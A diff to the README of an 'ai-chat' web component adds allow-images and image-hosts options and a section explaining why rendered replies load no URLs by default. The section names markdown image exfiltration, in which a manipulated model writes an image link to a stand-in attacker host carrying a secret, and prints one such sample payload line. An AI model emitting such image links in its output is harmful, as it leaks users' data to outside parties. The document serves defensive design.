@@ -340,6 +340,8 @@ const upstream = await fetch('https://api.openai.com/v1/chat/completions', {
 | `max-attachment-size` | number (bytes)           | `0`     | Max size per file; `0` = no cap.                                                  |
 | `conversation-id`  | string                      | —       | Your key for the conversation on screen. Echoed back on `ai-chat:background-message` so you know which conversation a background reply belongs to. See [Background streaming](#background-streaming). |
 | `abort-on-switch`  | boolean                     | `false` | Cancel an in-flight reply when the conversation is switched or cleared, instead of letting it finish in the background. |
+| `allow-images`     | boolean                     | `false` | Render images inside replies. Off, an image shows as its alt text and nothing in a reply loads a URL. See [Images in replies](#images-in-replies). |
+| `image-hosts`      | string (space-separated)    | —       | With `allow-images`, the URL prefixes images may load from (e.g. `https://cdn.example.com/`). Only `https:` ever loads. Also settable as an array property `.imageHosts`. |
 
 To turn a boolean attribute off, set it to `"false"` (e.g. `show-timestamps="false"`).
 
@@ -721,6 +723,26 @@ Configure it:
 | `accept`              | `image/*` | Allowed file types (standard `accept` syntax: `image/*`, `.pdf`, `image/png,application/pdf`, `*`). |
 | `max-attachments`     | `5`       | Max files per message.                         |
 | `max-attachment-size` | `0`       | Max bytes per file (`0` = no cap).             |
+
+### Images in replies
+
+A reply is model output, and a model can be talked into writing anything —
+including an image whose URL carries data out of the page the moment it shows
+(`![](https://evil.example/?d=<secret>)`, "markdown image exfiltration"). So by
+default **nothing in a rendered message loads a URL by itself**: images show as
+their alt text, and `style` attributes and tags, `srcset`, media, SVG images and
+image inputs are stripped. Links get `rel="noopener noreferrer"`.
+
+If your replies genuinely need pictures, opt in and allowlist where they may
+come from:
+
+```html
+<ai-chat allow-images image-hosts="https://cdn.example.com/ https://images.example.org/assets/"></ai-chat>
+```
+
+Only `https:` URLs that start with one of the prefixes load, and they load with
+`referrerpolicy="no-referrer"`. `allow-images` without `image-hosts` allows any
+`https:` image — only do that if you trust everything your model reads.
 
 ### Paste/drag without the button
 
